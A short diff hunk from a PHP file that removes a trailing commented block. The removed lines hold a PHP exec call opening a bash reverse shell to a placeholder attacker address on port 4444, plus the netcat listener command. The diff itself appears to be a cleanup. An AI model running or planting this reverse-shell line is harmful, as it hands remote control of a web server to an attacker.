@@ -77,10 +77,3 @@ if (isset($_REQUEST["action"])) {
     }
 }
 ?>
-
-/*
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'");
-?>
-get reverse shell: nc -lvnp 4444
-*/
